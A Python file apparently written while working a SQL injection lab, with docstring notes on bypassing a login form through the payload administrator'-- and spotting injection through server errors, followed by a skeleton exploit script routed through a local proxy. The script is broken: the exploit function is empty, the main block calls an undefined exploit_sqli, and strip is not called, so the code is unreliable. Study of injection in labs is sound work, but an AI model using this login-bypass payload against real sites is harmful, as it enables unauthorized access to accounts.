"""  
Summary:
Apps checks the credentials by performing the following SQL query:

SELECT * FROM users WHERE username = 'admin' AND password = 'admin'

[ note: it prob be different, usually the password has a hashing functionality when being stored in the db] 

If the query returns the details of a user, then the login is successful. Otherwise, it is rejected.

attacker can log in as any user without a password simply by using the SQL comment sequence -- to remove the password check from the WHERE clause of the query. For example, submitting the username administrator'-- and a blank password results in the following query:

SELECT * FROM users WHERE username = 'administrator'--' AND password = ''

Example:

Username: administrator ' --'
Password: 

Lab summary/thoughts:

SQL injection - login functioanlity

End Goal: perform SQLI attack and log in as the administrator user

hint:  if you put a sql command and it provide an error  that crashes the app, it could mean its vulnerable 

example of error: 'Internal Server error'

Example: 
SELECT * FROM users WHERE username = ''' AND password = 'admin'

reason because the quote closes off username and the rest of the query would cause a syntax error


"""

import requests
import sys
import urllib3

proxie = {'http': 'http://127.0.0.1:8080','https':'https://127.0.0.1:8080' }

def exploit(s,url,payload):
    """ For this function, you need to find out the request, best method is to use burp or a Man in the middle requester"""


if __name__=="__main__":
    try:
        url = sys.argv[1].strip
        sqli_payload = sys.argv[2].strip()


    except IndexError:
        print('[-] Usage: %s <url> <sql-payload>' % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' %sys.argv[0])

    s = requests.Session()

    if exploit_sqli(s,url,sqli_payload):
        print('[+] SQL injection successful! Logged in as the admin user.')
    else:
        print('[-] SQLi unsuccessful')